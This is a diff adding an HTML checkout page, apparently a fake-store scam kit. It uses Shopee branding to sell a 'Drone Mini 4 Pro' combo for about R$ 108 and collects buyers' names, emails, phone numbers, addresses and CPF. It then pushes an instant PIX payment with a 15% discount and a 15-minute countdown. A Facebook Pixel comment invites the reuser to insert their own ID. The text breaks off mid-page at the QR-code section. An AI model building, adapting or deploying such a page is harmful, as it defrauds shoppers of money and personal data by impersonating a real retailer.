@@ -1,0 +1,1973 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Checkout | Pagamento Seguro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- ===== FACEBOOK PIXEL ===== -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = 'https://connect.facebook.net/en_US/fbevents.js';
+            s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+
+        fbq('init', '1324047276137988'); // <-- TROCAR PELO ID DO SEU PIXEL
+        fbq('track', 'PageView');
+    </script>
+    <!-- ======================== -->
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+
+    <!-- QRCode -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+    <style>
+        :root {
+            --blue-header: #EE4D2C;
+            --blue-dark: #0b3c73;
+            --green-main: #EE4D2C;
+            --green-light: #e9fbf0;
+            --border-soft: #e4e8f0;
+            --text-main: #1c2430;
+            --text-muted: #7b8497;
+            --bg-page: #f4f6fb;
+            --yellow-soft: #fff7e3;
+            --yellow-border: #f3d692;
+            --radius-card: 18px;
+            --shadow-soft: 0 8px 20px rgba(0, 0, 0, 0.06);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        body {
+            font-family: 'Montserrat', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: var(--bg-page);
+            color: var(--text-main);
+        }
+
+        .checkout-shell {
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: #f7f9ff;
+        }
+
+        .main-header {
+            background: var(--blue-header);
+            padding: 18px 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .main-header img {
+            max-width: 180px;
+            height: auto;
+            display: block;
+        }
+
+        .checkout-content {
+            flex: 1;
+            padding: 14px 12px 24px 12px;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: var(--radius-card);
+            box-shadow: var(--shadow-soft);
+            padding: 16px 16px 18px;
+            margin-bottom: 12px;
+        }
+
+        .steps-wrapper {
+            background: #fff;
+            border-radius: var(--radius-card);
+            box-shadow: var(--shadow-soft);
+            padding: 14px 10px 6px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .step-indicator {
+            flex: 1;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            position: relative;
+        }
+
+        .step-indicator:not(:last-child)::after {
+            content: '';
+            position: absolute;
+            right: -5px;
+            top: 16px;
+            width: 10px;
+            height: 2px;
+            background: #d2d7e5;
+        }
+
+        .step-circle {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            border: 2px solid #d6dced;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: #9ea6bd;
+            background: #fff;
+        }
+
+        .step-label {
+            font-size: 11px;
+            font-weight: 500;
+            color: #9ea6bd;
+        }
+
+        .step-indicator.active .step-circle {
+            border-color: var(--green-main);
+            color: #fff;
+            background: var(--green-main);
+        }
+
+        .step-indicator.active .step-label {
+            color: var(--green-main);
+        }
+
+        .order-summary-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 13px;
+            margin-bottom: 10px;
+        }
+
+        .order-summary-title {
+            font-weight: 600
+        }
+
+        .order-summary-total span {
+            font-weight: 700;
+            color: var(--blue-dark);
+        }
+
+        .order-product {
+            display: flex;
+            gap: 10px;
+            padding: 10px 0;
+            border-top: 1px solid var(--border-soft);
+            border-bottom: 1px solid var(--border-soft);
+            margin-bottom: 10px;
+        }
+
+        .product-thumb {
+            width: 48px;
+            height: 48px;
+            border-radius: 8px;
+            background: #f2f4fb;
+            overflow: hidden;
+        }
+
+        .product-thumb img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .product-info {
+            flex: 1;
+            font-size: 12px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .product-name {
+            font-weight: 600;
+            line-height: 1.3;
+        }
+
+        .product-line {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
+        .order-values {
+            font-size: 12px;
+        }
+
+        .order-values-row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 2px;
+        }
+
+        .order-values-row span:last-child {
+            font-weight: 600
+        }
+
+        .order-total-row span:first-child {
+            font-weight: 600
+        }
+
+        .order-total-row span:last-child {
+            color: var(--blue-dark)
+        }
+
+        .discount-card {
+            margin-top: 10px;
+            border-radius: 14px;
+            border: 1px solid #c9f0d6;
+            background: #edfff4;
+            padding: 10px 12px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            font-size: 12px;
+        }
+
+        .discount-icon {
+            width: 20px;
+            height: 20px;
+            border-radius: 999px;
+            background: #d5f5df;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1a7b3a;
+            font-size: 13px;
+            flex-shrink: 0;
+        }
+
+        .discount-text-main {
+            font-weight: 600;
+            margin-bottom: 2px;
+            color: #1a7b3a
+        }
+
+        .discount-text-sub {
+            font-size: 11px;
+            color: #2f8a4b
+        }
+
+        .discount-close {
+            margin-left: auto;
+            font-size: 14px;
+            color: #b7c2c4;
+        }
+
+        .order-highlight {
+            margin-top: 10px;
+            font-size: 12px;
+            background: var(--green-light);
+            border-radius: 12px;
+            padding: 10px 12px;
+            color: #1a5b38;
+            line-height: 1.4;
+        }
+
+        .benefits {
+            margin-top: 12px;
+            background: #fff;
+            border-radius: var(--radius-card);
+            box-shadow: var(--shadow-soft);
+            padding: 14px 16px;
+            font-size: 12px;
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .benefit-icon {
+            width: 20px;
+            height: 20px;
+            border-radius: 999px;
+            background: #f1f3fb;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            color: var(--blue-dark);
+        }
+
+        .benefit-text-title {
+            font-weight: 600;
+            margin-bottom: 1px
+        }
+
+        .benefit-text-sub {
+            color: var(--text-muted);
+            font-size: 11px
+        }
+
+        .card-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px
+        }
+
+        .card-subtitle {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-bottom: 6px
+        }
+
+        .form-field {
+            margin-bottom: 10px
+        }
+
+        .form-label {
+            display: block;
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-bottom: 4px
+        }
+
+        .form-input {
+            width: 100%;
+            border-radius: 999px;
+            border: 1px solid var(--border-soft);
+            padding: 10px 14px;
+            font-size: 13px;
+            outline: none;
+            background: #f8faff;
+        }
+
+        .form-input::placeholder {
+            color: #c1c8d9
+        }
+
+        .form-input:focus {
+            border-color: var(--green-main);
+            background: #fff
+        }
+
+        .form-row-2 {
+            display: flex;
+            gap: 8px
+        }
+
+        .btn-main {
+            width: 100%;
+            border-radius: 999px;
+            border: none;
+            padding: 12px 14px;
+            background: var(--green-main);
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 4px;
+            box-shadow: 0 10px 20px rgba(0, 200, 83, .28);
+            cursor: pointer;
+        }
+
+        .btn-main:active {
+            transform: translateY(1px);
+            box-shadow: 0 6px 15px rgba(0, 200, 83, .22)
+        }
+
+        .btn-ghost {
+            width: 100%;
+            border-radius: 999px;
+            border: 1px solid var(--border-soft);
+            padding: 11px 14px;
+            color: var(--text-main);
+            font-weight: 500;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 8px;
+            background: #fff;
+            cursor: pointer;
+        }
+
+        .btn-ghost:active {
+            background: #f3f5fb
+        }
+
+        /* MÉTODOS DE PAGAMENTO - VERTICAIS */
+        .payment-methods {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .pay-option {
+            position: relative;
+            border-radius: 14px;
+            border: 1px solid var(--border-soft);
+            padding: 10px 12px;
+            font-size: 11px;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            cursor: pointer;
+            background: #fff;
+        }
+
+        .pay-option-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .pay-option-circle {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 2px solid #d0d6e7;
+            position: relative;
+            margin-left: auto;
+        }
+
+        .pay-option-circle::after {
+            content: '';
+            position: absolute;
+            inset: 3px;
+            border-radius: 50%;
+            background: transparent;
+        }
+
+        .pay-option-label-main {
+            font-weight: 600;
+            font-size: 12px
+        }
+
+        .pay-option-label-sub {
+            font-size: 10px;
+            color: var(--text-muted)
+        }
+
+        .pay-option.active {
+            border-color: var(--green-main);
+            background: #f0fff6;
+        }
+
+        .pay-option.active .pay-option-circle::after {
+            background: var(--green-main);
+        }
+
+        .pay-badge {
+            position: absolute;
+            top: -9px;
+            right: 14px;
+            background: #e7ffe8;
+            color: #1a7b3a;
+            font-size: 9px;
+            font-weight: 700;
+            padding: 3px 8px;
+            border-radius: 999px;
+            border: 1px solid #b8f0c0;
+        }
+
+        .pix-card {
+            border-radius: 18px;
+            border: 1px solid var(--border-soft);
+            background: #fff;
+            padding: 14px;
+            margin-bottom: 8px;
+        }
+
+        .pix-pricing {
+            margin-top: 6px;
+            border-radius: 12px;
+            background: #f6fffb;
+            padding: 10px 12px;
+            font-size: 12px;
+        }
+
+        .pix-pricing-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 4px;
+        }
+
+        .pix-pricing-row.total {
+            margin-top: 4px;
+            padding-top: 6px;
+            border-top: 1px solid #d7ecdd;
+            font-weight: 600;
+        }
+
+        .pix-pricing-row.total span:last-child {
+            color: #0f8c3f;
+            font-size: 16px;
+        }
+
+        .pix-discount-pill {
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 999px;
+            background: #e3f9eb;
+            color: #1a7b3a;
+            margin-left: 4px;
+        }
+
+        .pix-benefits {
+            margin-top: 12px;
+            border-radius: 14px;
+            background: #f7fbff;
+            padding: 10px 10px 6px;
+            font-size: 11px;
+        }
+
+        .pix-benefit-line {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 6px;
+        }
+
+        .pix-benefit-icon {
+            width: 22px;
+            height: 22px;
+            border-radius: 999px;
+            background: #eef6ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+
+        .pix-benefit-text-title {
+            font-weight: 600;
+            margin-bottom: 1px
+        }
+
+        .pix-benefit-text-sub {
+            color: var(--text-muted);
+            font-size: 10px
+        }
+
+        .footer {
+            padding: 16px 14px 22px;
+            background: #f7f9ff;
+            margin-top: 4px;
+        }
+
+        .footer-title {
+            font-size: 11px;
+            font-weight: 600;
+            margin-bottom: 6px
+        }
+
+        .footer-icons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            margin-bottom: 10px
+        }
+
+        .footer-flag {
+            min-width: 36px;
+            padding: 3px 6px;
+            border-radius: 4px;
+            border: 1px solid #dde2f1;
+            font-size: 9px;
+            text-align: center;
+            background: #fff;
+        }
+
+        .footer-address {
+            font-size: 9px;
+            color: var(--text-muted);
+            line-height: 1.4;
+            margin-bottom: 6px;
+        }
+
+        .footer-safe {
+            font-size: 10px;
+            color: #20b144;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-top: 2px;
+        }
+
+        .footer-safe-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #20b144;
+        }
+
+        .step-screen {
+            display: none
+        }
+
+        .step-screen.active {
+            display: block
+        }
+
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, .42);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 30;
+        }
+
+        .modal-overlay.hidden {
+            display: none
+        }
+
+        .modal-card {
+            width: 92%;
+            max-width: 420px;
+            background: #fff;
+            border-radius: 22px;
+            box-shadow: 0 16px 40px rgba(0, 0, 0, .4);
+            padding: 26px 24px 22px;
+            text-align: center;
+        }
+
+        .modal-spinner {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            border: 4px solid #e3f2ff;
+            border-top-color: #2a9dfb;
+            animation: spin 900ms linear infinite;
+            margin: 0 auto 14px;
+        }
+
+        .modal-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 6px
+        }
+
+        .modal-sub {
+            font-size: 12px;
+            color: var(--text-muted)
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg)
+            }
+        }
+
+        .pix-final-wrapper {
+            padding-top: 10px
+        }
+
+        .pix-header-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 4px
+        }
+
+        .pix-header-sub {
+            font-size: 12px;
+            color: var(--text-muted)
+        }
+
+        .pix-header-sub span {
+            color: var(--blue-dark);
+            font-weight: 700
+        }
+
+        .pix-total-line {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            margin-top: 14px;
+            padding-top: 12px;
+            border-top: 1px solid var(--border-soft);
+        }
+
+        .pix-total-line span:last-child {
+            color: var(--blue-dark);
+            font-weight: 700
+        }
+
+        .pix-qrcode-card {
+            margin-top: 12px;
+            padding: 16px 12px;
+            border-radius: 16px;
+            border: 1px solid var(--border-soft);
+            background: #fff;
+            text-align: center;
+        }
+
+        #pix-qrcode-box {
+            display: inline-block;
+            padding: 8px;
+            border-radius: 10px;
+            background: #fff;
+            box-shadow: 0 0 0 1px #e0e5f0;
+            margin-bottom: 10px;
+        }
+
+        .pix-qrcode-hint {
+            font-size: 11px;
+            color: var(--text-muted)
+        }
+
+        .pix-code-label {
+            margin-top: 14px;
+            font-size: 11px;
+            color: var(--text-main);
+            margin-bottom: 4px
+        }
+
+        .pix-code-row {
+            display: flex;
+            gap: 6px
+        }
+
+        .pix-code-input {
+            flex: 1;
+            border-radius: 999px;
+            border: 1px solid var(--border-soft);
+            padding: 10px 14px;
+            font-size: 11px;
+            background: #f8faff;
+            overflow: hidden;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+        }
+
+        .btn-copy {
+            padding: 0 16px;
+            border-radius: 999px;
+            border: none;
+            background: #05a7ff;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 600;
+            white-space: nowrap;
+            cursor: pointer;
+        }
+
+        .pix-warning {
+            margin-top: 12px;
+            border-radius: 14px;
+            padding: 10px 12px;
+            background: var(--yellow-soft);
+            border: 1px solid var(--yellow-border);
+            font-size: 11px;
+            color: #b1892f;
+            line-height: 1.4;
+            display: flex;
+            gap: 8px;
+        }
+
+        .pix-warning-icon {
+            width: 18px;
+            height: 18px;
+            border-radius: 999px;
+            background: #ffefc2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+        }
+
+        .bank-list-card {
+            margin-top: 12px;
+            border-radius: 14px;
+            background: #fff;
+            border: 1px solid var(--border-soft);
+            padding: 12px;
+            font-size: 11px;
+        }
+
+        .bank-list-title {
+            font-weight: 600;
+            margin-bottom: 8px
+        }
+
+        .bank-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 7px 0;
+            border-bottom: 1px solid #f1f3fb;
+        }
+
+        .bank-row:last-child {
+            border-bottom: none
+        }
+
+        .bank-left {
+            display: flex;
+            align-items: center;
+            gap: 7px
+        }
+
+        .bank-logo-placeholder {
+            width: 22px;
+            height: 22px;
+            border-radius: 6px;
+            background: #f2f4fc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            color: #5b6280;
+        }
+
+        .bank-name {
+            font-weight: 500
+        }
+
+        .bank-note {
+            font-size: 10px;
+            color: var(--text-muted)
+        }
+
+        .bank-right {
+            font-size: 9px;
+            color: var(--text-muted)
+        }
+
+        .btn-see-banks {
+            margin-top: 8px;
+            width: 100%;
+            border-radius: 999px;
+            border: 1px solid var(--border-soft);
+            padding: 8px;
+            background: #fff;
+            font-size: 11px;
+            font-weight: 500;
+            text-align: center;
+            cursor: pointer;
+        }
+
+        .how-to-pix-card {
+            margin-top: 12px;
+            border-radius: 14px;
+            background: #fff;
+            border: 1px solid var(--border-soft);
+            padding: 12px 14px 10px;
+            font-size: 11px;
+        }
+
+        .how-title {
+            font-weight: 600;
+            margin-bottom: 8px
+        }
+
+        .how-list {
+            list-style: none;
+            padding-left: 0
+        }
+
+        .how-item {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 4px;
+            align-items: flex-start;
+        }
+
+        .how-number {
+            width: 16px;
+            height: 16px;
+            border-radius: 999px;
+            border: 1px solid #d2d9ea;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 9px;
+            margin-top: 2px;
+        }
+
+        .status-line {
+            margin-top: 10px;
+            font-size: 11px;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #f4c95d;
+        }
+
+        @media(min-width:481px) {
+            body {
+                background: #d9e1f4
+            }
+
+            .checkout-shell {
+                margin-top: 18px;
+                margin-bottom: 18px;
+                border-radius: 18px;
+                overflow: hidden;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- noscript do pixel -->
+    <noscript>
+        <img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=SEU_PIXEL_ID_AQUI&ev=PageView&noscript=1" />
+    </noscript>
+
+    <div class="checkout-shell">
+        <header class="main-header">
+            <img src="https://i.ibb.co/svb60F59/Logo-2520-Shopee-2520-White-d247f0f6.png" alt="Shopee" />
+        </header>
+
+        <main class="checkout-content">
+            <div class="steps-wrapper" id="stepper">
+                <div class="step-indicator active" data-step-label="1">
+                    <div class="step-circle">1</div>
+                    <div class="step-label">Identificação</div>
+                </div>
+                <div class="step-indicator" data-step-label="2">
+                    <div class="step-circle">2</div>
+                    <div class="step-label">Endereço</div>
+                </div>
+                <div class="step-indicator" data-step-label="3">
+                    <div class="step-circle">3</div>
+                    <div class="step-label">Pagamento</div>
+                </div>
+            </div>
+
+            <!-- STEP 1 -->
+            <section id="screen-identificacao" class="step-screen active">
+                <div class="card">
+                    <div class="order-summary-header">
+                        <div class="order-summary-title">Resumo do Pedido <span style="font-weight:400;">(1 item)</span>
+                        </div>
+                        <div class="order-summary-total">
+                            R$ <span id="summary-total">107,92</span>
+                        </div>
+                    </div>
+
+                    <div class="order-product">
+                        <div class="product-thumb">
+                            <img src="https://i.ibb.co/p8qV60P/269181df.png" alt="Produto" />
+                        </div>
+                        <div class="product-info">
+                            <div class="product-name">
+                                Drone Mini 4 Pro Fly More Combo com câmera 4K cinza 3 baterias (Com Tela)
+                            </div>
+                            <div class="product-line">
+                                <span>Qtd: 1</span>
+                                <span><strong>R$ 107,92</strong></span>
+                            </div>
+                        </div>
+                    </div>
+
+
+
+                    <div class="order-values" style="margin-top:8px;">
+                        <div class="order-values-row">
+                            <span>Subtotal</span>
+                            <span>R$ 107,92</span>
+                        </div>
+
+
+                    </div>
+
+                    <div class="order-highlight">
+                        <strong>Inclui:</strong><br />
+                        1x Drone Mini Pro 4 | Controle remoto | Bateria e carregador | Hélices extras
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">Dados pessoais</div>
+                    <div class="card-subtitle">
+                        Utilizaremos seu e-mail para identificar seu perfil, histórico de compra, notificação de pedidos
+                        e carrinho de compras.
+                    </div>
+
+                    <div class="form-field">
+                        <input id="nome-completo" class="form-input" type="text" placeholder="Nome completo" />
+                    </div>
+
+                    <div class="form-field">
+                        <input id="email" class="form-input" type="email" placeholder="E-mail" />
+                    </div>
+
+                    <div class="form-field form-row-2">
+                        <input class="form-input" style="max-width:80px;text-align:center;" type="text" value="+55"
+                            readonly />
+                        <input id="whatsapp" class="form-input" type="tel" placeholder="(11) 96123-4567" />
+                    </div>
+
+                    <button class="btn-main" onclick="goToStep(2)">Próximo</button>
+                </div>
+
+                <div class="benefits">
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🚚</div>
+                        <div>
+                            <div class="benefit-text-title">Frete Grátis</div>
+                            <div class="benefit-text-sub">Para todo o Brasil em compras acima de R$ 59,90</div>
+                        </div>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🔒</div>
+                        <div>
+                            <div class="benefit-text-title">Compra Segura</div>
+                            <div class="benefit-text-sub">Seus dados protegidos e pagamento seguro</div>
+                        </div>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">⚡</div>
+                        <div>
+                            <div class="benefit-text-title">Entrega Rápida</div>
+                            <div class="benefit-text-sub">Enviamos em até 24 horas após a confirmação</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- STEP 2 -->
+            <section id="screen-endereco" class="step-screen">
+                <div class="card">
+                    <div class="order-summary-header">
+                        <div class="order-summary-title">Resumo do Pedido <span style="font-weight:400;">(1 item)</span>
+                        </div>
+                        <div class="order-summary-total">
+                            R$ <span id="summary-total-2">107,92</span>
+                        </div>
+                    </div>
+
+                    <div class="order-product">
+                        <div class="product-thumb">
+                            <img src="https://i.ibb.co/p8qV60P/269181df.png" alt="Produto" />
+                        </div>
+                        <div class="product-info">
+                            <div class="product-name">
+                                Drone Mini 4 Pro Fly More Combo com câmera 4K cinza 3 baterias (Com Tela)
+                            </div>
+                            <div class="product-line">
+                                <span>Qtd: 1</span>
+                                <span><strong>R$ 107,92</strong></span>
+                            </div>
+                        </div>
+                    </div>
+
+
+
+                    <div class="order-values" style="margin-top:8px;">
+                        <div class="order-values-row">
+                            <span>Subtotal</span>
+                            <span>R$ 107,92</span>
+                        </div>
+
+                    </div>
+
+                    <div class="order-highlight">
+                        <strong>Inclui:</strong><br />
+                        1x Drone Mini Pro 4 | Controle remoto | Bateria e carregador | Hélices extras
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">Endereço de entrega</div>
+
+                    <div class="form-field">
+                        <input id="cep" class="form-input" type="text" placeholder="CEP" />
+                    </div>
+                    <div class="form-field">
+                        <input id="rua" class="form-input" type="text" placeholder="Rua, Avenida, etc." />
+                    </div>
+                    <div class="form-row-2 form-field">
+                        <input id="numero" class="form-input" type="text" placeholder="Número" />
+                        <input id="complemento" class="form-input" type="text" placeholder="Apto, Bloco, etc." />
+                    </div>
+                    <div class="form-field">
+                        <input id="bairro" class="form-input" type="text" placeholder="Bairro" />
+                    </div>
+                    <div class="form-row-2 form-field">
+                        <input id="cidade" class="form-input" type="text" placeholder="Cidade" />
+                        <input id="estado" class="form-input" type="text" placeholder="UF" />
+                    </div>
+
+                    <div class="pix-benefits" style="margin-top:6px;">
+                        <div class="pix-benefit-line">
+                            <div class="pix-benefit-icon">🚚</div>
+                            <div>
+                                <div class="pix-benefit-text-title">Frete Grátis</div>
+                                <div class="pix-benefit-text-sub">3 a 7 dias úteis — Grátis</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button class="btn-ghost" onclick="goToStep(1)">Voltar</button>
+                    <button class="btn-main" onclick="goToStep(3)">Ir para Pagamento</button>
+                </div>
+
+                <div class="benefits">
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🚚</div>
+                        <div>
+                            <div class="benefit-text-title">Frete Grátis</div>
+                            <div class="benefit-text-sub">Para todo o Brasil em compras acima de R$ 59,90</div>
+                        </div>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🔒</div>
+                        <div>
+                            <div class="benefit-text-title">Compra Segura</div>
+                            <div class="benefit-text-sub">Seus dados protegidos e pagamento seguro</div>
+                        </div>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">⚡</div>
+                        <div>
+                            <div class="benefit-text-title">Entrega Rápida</div>
+                            <div class="benefit-text-sub">Enviamos em até 24 horas após a confirmação</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- STEP 3 -->
+            <section id="screen-pagamento" class="step-screen">
+                <div class="card">
+                    <div class="order-summary-header">
+                        <div class="order-summary-title">Resumo do Pedido <span style="font-weight:400;">(1 item)</span>
+                        </div>
+                        <div class="order-summary-total">
+                            R$ <span id="summary-total-3">107,92</span>
+                        </div>
+                    </div>
+
+                    <div class="order-product">
+                        <div class="product-thumb">
+                            <img src="https://i.ibb.co/p8qV60P/269181df.png" alt="Produto" />
+                        </div>
+                        <div class="product-info">
+                            <div class="product-name">
+                                Drone Mini 4 Pro Fly More Combo com câmera 4K cinza 3 baterias (Com Tela)
+                            </div>
+                            <div class="product-line">
+                                <span>Qtd: 1</span>
+                                <span><strong>R$ 107,92</strong></span>
+                            </div>
+                        </div>
+                    </div>
+
+
+
+                    <div class="order-values" style="margin-top:8px;">
+                        <div class="order-values-row">
+                            <span>Subtotal</span>
+                            <span>R$ 107,92</span>
+                        </div>
+
+
+                    </div>
+
+                    <div class="order-highlight">
+                        <strong>Inclui:</strong><br />
+                        1x Drone Mini Pro 4 | Controle remoto | Bateria e carregador | Hélices extras
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">Pagamento</div>
+                    <div class="card-subtitle">Escolha a forma de pagamento</div>
+
+                    <div class="payment-methods">
+                        <div class="pay-option" id="opt-credit">
+                            <div class="pay-option-header">
+                                <div>💳</div>
+                                <div>
+                                    <div class="pay-option-label-main">Cartão de Crédito</div>
+                                    <div class="pay-option-label-sub">Parcele em até 12x</div>
+                                </div>
+                                <div class="pay-option-circle"></div>
+                            </div>
+                        </div>
+
+                        <div class="pay-option active" id="opt-pix">
+                            <span class="pay-badge">15% OFF</span>
+                            <div class="pay-option-header">
+                                <div>⚡</div>
+                                <div>
+                                    <div class="pay-option-label-main">PIX</div>
+                                    <div class="pay-option-label-sub">Pagamento instantâneo</div>
+                                </div>
+                                <div class="pay-option-circle"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="pix-card">
+                        <div class="card-title" style="margin-bottom:6px;">Pagamento via PIX</div>
+
+                        <div class="pix-pricing">
+                            <div class="pix-pricing-row">
+                                <span>Valor original:</span>
+                                <span id="pix-original">R$ 152,90</span>
+                            </div>
+                            <div class="pix-pricing-row">
+                                <span>Desconto de 15%</span>
+                                <span>
+                                    Economize <span class="pix-discount-pill" id="pix-discount">R$ 22,93</span>
+                                </span>
+                            </div>
+                            <div class="pix-pricing-row total">
+                                <span>Valor com desconto:</span>
+                                <span id="pix-total-main">R$ 107,92</span>
+                            </div>
+                        </div>
+
+                        <div class="pix-benefits">
+                            <div class="pix-benefit-line">
+                                <div class="pix-benefit-icon">⚡</div>
+                                <div>
+                                    <div class="pix-benefit-text-title">Aprovação instantânea</div>
+                                    <div class="pix-benefit-text-sub">Liberação imediata do pedido</div>
+                                </div>
+                            </div>
+                            <div class="pix-benefit-line">
+                                <div class="pix-benefit-icon">💸</div>
+                                <div>
+                                    <div class="pix-benefit-text-title">Sem custos extras</div>
+                                    <div class="pix-benefit-text-sub">Transferência gratuita</div>
+                                </div>
+                            </div>
+                            <div class="pix-benefit-line">
+                                <div class="pix-benefit-icon">🛡️</div>
+                                <div>
+                                    <div class="pix-benefit-text-title">100% Seguro</div>
+                                    <div class="pix-benefit-text-sub">Desenvolvido pelo Banco Central</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="form-field" style="margin-top:12px;">
+                            <div class="form-label">CPF do pagador</div>
+                            <input id="cpf-pagador" class="form-input" type="text" placeholder="CPF" />
+                        </div>
+
+                        <button class="btn-main" onclick="gerarPix()">Gerar QR Code PIX</button>
+                        <button class="btn-ghost" onclick="goToStep(2)">Voltar</button>
+                    </div>
+                </div>
+
+                <div class="benefits">
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🚚</div>
+                        <div>
+                            <div class="benefit-text-title">Frete Grátis</div>
+                            <div class="benefit-text-sub">Para todo o Brasil em compras acima de R$ 59,90</div>
+                        </div>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🔒</div>
+                        <div>
+                            <div class="benefit-text-title">Compra Segura</div>
+                            <div class="benefit-text-sub">Seus dados protegidos e pagamento seguro</div>
+                        </div>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">⚡</div>
+                        <div>
+                            <div class="benefit-text-title">Entrega Rápida</div>
+                            <div class="benefit-text-sub">Enviamos em até 24 horas após a confirmação</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- STEP 4 PIX -->
+            <section id="screen-pix" class="step-screen">
+                <div class="card pix-final-wrapper">
+                    <div class="pix-header-title">Já é quase seu...</div>
+                    <div class="pix-header-sub">
+                        Pague seu Pix dentro de
+                        <span id="pix-timer">15:00</span>
+                        para garantir sua compra.
+                    </div>
+
+                    <div class="pix-total-line">
+                        <span>Total do pedido:</span>
+                        <span id="pix-total-final">R$ 107,92</span>
+                    </div>
+
+                    <div class="pix-qrcode-card">
+                        <div id="pix-qrcode-box">
+                            <div id="pix-qrcode"></div>
+                        </div>
+                        <div class="pix-qrcode-hint">Aponte a câmera do seu celular</div>
+
